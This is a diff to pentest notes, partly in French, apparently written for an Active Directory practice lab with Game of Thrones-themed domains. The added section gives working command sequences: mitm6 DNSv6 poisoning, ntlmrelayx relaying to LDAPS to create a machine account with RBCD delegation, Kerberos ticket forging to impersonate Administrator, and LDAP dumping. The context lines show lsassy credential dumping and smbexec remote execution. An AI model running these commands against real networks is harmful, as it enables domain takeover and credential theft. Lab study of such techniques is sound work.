@@ -33,8 +33,8 @@ nxc smb 192.168.56.10-23 --gen-relay-list relay.txt
 Stop the responder smb and http server as we don’t want to get the hashes directly but we want to relay them to ntlmrelayx -> /usr/share/responder/Responder.conf
 
 ```bash
-sed -i 's/HTTP = On/HTTP = Off/g' /usr/share/responder/Responder.conf && cat /usr/share/responder/Responder.conf | grep --color=never 'HTTP ='
-sed -i 's/SMB = On/SMB = Off/g' /usr/share/responder/Responder.conf && cat /usr/share/responder/Responder.conf | grep --color=never 'SMB ='
+sed -i 's/HTTP = On/HTTP = Off/g' /usr/share/responder/Responder.conf
+sed -i 's/SMB = On/SMB = Off/g' /usr/share/responder/Responder.conf
 ```
 
 Démarrer Responder pour empoisonner les réponses aux requêtes et les rediriger vers NTLMrelayx qui va host un proxy socks que l'on utilisera par la suite pour réaliser des actions sur les devices sur lesquels une sessions est ouverte.
@@ -60,3 +60,36 @@ proxychains lsassy --no-pass -d NORTH -u EDDARD.STARK 192.168.56.22
 proxychains impacket-smbclient -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22' -debug
 proxychains impacket-smbexec -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22' -debug
 ```
+
+## Mitm6 + ntlmrelayx to ldap
+
+Empoisonne les requêtes DNSv6 sur le réseau pour rediriger les clients vers un serveur WPAD contrôlé.
+
+<pre class="language-bash"><code class="lang-bash"><strong>mitm6 -i eth1 -d essos.local -d sevenkingdoms.local -d north.sevenkingdoms.local --debug
+</strong></code></pre>
+
+Relaye l'authentification NTLM interceptée vers LDAPS pour créer un compte machine avec délégation RBCD.
+
+```bash
+ntlmrelayx.py -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.local --add-computer relayedpccreate --delegate-access
+```
+
+Vérifie si un compte dispose de droits de délégation sur des machines cibles dans l’AD.
+
+```bash
+impacket-findDelegation essos.local/relayedpccreate\$:'ttrJB6qsD;B3BSn' -dc-ip 192.168.56.12
+```
+
+Forge un ticket Kerberos pour un utilisateur ciblé via S4U2Proxy en exploitant une délégation RBCD.
+
+```bash
+impacket-getST -spn HOST/BRAAVOS.ESSOS.LOCAL -impersonate Administrator -dc-ip 192.168.56.12 'ESSOS.LOCAL/relayedpccreate$:ttrJB6qsD;B3BSn'
+```
+
+If we specify a loot dir all the informations on the ldap are automatically dumped
+
+```
+ntlmrelayx.py -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.local -l /workspace/loot
+```
+
+## Coerced auth smb + ntlmrelayx to ldaps with drop the mic <a href="#coerced-auth-smb--ntlmrelayx-to-ldaps-with-drop-the-mic" id="coerced-auth-smb--ntlmrelayx-to-ldaps-with-drop-the-mic"></a>
